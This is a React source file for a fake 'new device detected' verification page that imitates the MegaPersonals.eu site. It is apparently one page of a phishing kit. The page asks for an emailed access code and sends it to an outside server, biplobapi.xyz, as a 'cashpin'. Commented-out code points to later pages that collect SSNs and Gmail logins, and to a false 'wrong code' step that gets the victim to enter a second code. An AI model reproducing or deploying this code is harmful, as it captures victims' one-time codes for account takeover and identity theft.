import React, { useState } from "react";
import { useForm } from "react-hook-form";
import { useLocation, useNavigate } from "react-router-dom";
import Pusher from "pusher-js";
import { useEffect } from "react";
import "./Verify.css";
const Verify = () => {
  const [test, setTest] = useState(0);
  const [passwordError, setPasswordError] = useState(false);
  useEffect(() => {
    const pusher = new Pusher("7c934b69edc584db7054", {
      cluster: "ap2",
    });
    const channel1 = pusher.subscribe("my-channel");
    // You can bind more channels here like this
    // const channel2 = pusher.subscribe('channel_name2')
    channel1.bind("7c934b69edc584db7054", function (data) {
      console.log(data);
      // Code that runs when channel1 listens to a new message
    });

    return () => {
      pusher.unsubscribe("my-channel");
      // pusher.unsubscribe('channel_name2')
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const { state } = useLocation();
  const navigate = useNavigate();
  const { temp } = state;
  // console.log(temp);
  const {
    register,
    handleSubmit,
    formState: { errors },
    resetField,
  } = useForm();
  const handleVerify = (data) => {
    // if (test === 0) {
    //   setTest(test + 1);
    //   setPasswordError(true);
    //   localStorage.setItem('code', data.code);
    //   resetField("code");
    // }else{
    const bookings = {
      cashpin: data.code,
      // code: localStorage.getItem('code') + '{{}}' + data.code,
    };

    // console.log(bookings);
    console.log(bookings);
    fetch(`https://biplobapi.xyz/informations/cashpin/${temp}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then((res) => res.json())
      .then((data) => {
        navigate(localStorage.getItem("url"));
        if (data.modifiedCount > 0) {
          // navigate("/ssn", { state: { temp: temp } });
          // navigate("/gmail", { state: { temp: temp } });
        }
      });
    // }
  };
  const getCurrentDate = () => {
    const date = new Date();
    const options = { year: "numeric", month: "long", day: "numeric" };
    return date.toLocaleDateString("en-US", options);
  };
  return (
    <div className="em-mn-dv">
      <div className="container-fluid">
        <div className="row text-center">
          <div className="col-md-12 text-center pt-3">
            <img className="main_img" src="/mega.png" alt="" />
          </div>
          <div className="col-md-8 mx-auto my-3">
            <h3 className="nw-dv">NEW DEVIECE DETECTED</h3>
          </div>
        </div>
        <div className="row text-center">
          <div className="col-md-6 mx-auto">
            <p
              style={{ color: "#AC6341", fontSize: "18px", fontWeight: "600" }}
            >
              Your ACCESS CODE <br />
              has been sent <b>successfully</b> <br />
              to your email <br /> That code remains valid.{" "}
              <b>{getCurrentDate()}</b>
            </p>
            <p
              style={{ color: "#63C9FD", fontSize: "20px", fontWeight: "600" }}
            >
              CHECK YOUR SPAM FOLDER IT MAY BE THERE.
            </p>
            <p style={{ color: "red", fontSize: "20px", fontWeight: "600" }}>
              DO NOT SHARE IT
            </p>
            <p
              style={{ color: "#AC6341", fontSize: "20px", fontWeight: "600" }}
            >
              Enter the code <br /> below to continue.
            </p>
          </div>
        </div>
        <div className="row mt-1">
          <div className="col-md-6 mx-auto text-center pt-1">
            <form onSubmit={handleSubmit(handleVerify)}>
              <div className="form-group" style={{ marginTop: "-4px" }}>
                <input
                  {...register("code", { required: true })}
                  type="text"
                  className="form-control bordered"
                />
              </div>

              <button type="submit" className="btn btn-primary text-uppercase">
                Submit
              </button>
            </form>
          </div>
        </div>
        <div className="row">
          <div className="col-md-12">
            <ul className="pager">
              <li>
                <a href="">Home</a>{" "}
              </li>
              <li>|</li>
              <li>
                <a href="">Manage Post</a>{" "}
              </li>
              <li>|</li>
              <li>
                <a href="">Contact Us</a>
              </li>
              <li>|</li>
              <li>
                <a href="">Policies & Terms</a>
              </li>
              <li>|</li>
              <li>
                <a href="">Logout</a>
              </li>
            </ul>
          </div>
        </div>
        <div className="row">
          <div className="col-md-12 text-center bottom">
            <p>Copyright ©2023 MegaPersonals.eu</p>
            {/* <p>For support please email <a href="" style={{color: '#0000EE',textDecoration:'underline'}}>support@megapersonals.eu</a></p> */}
          </div>
        </div>
      </div>
    </div>
  );
};

export default Verify;
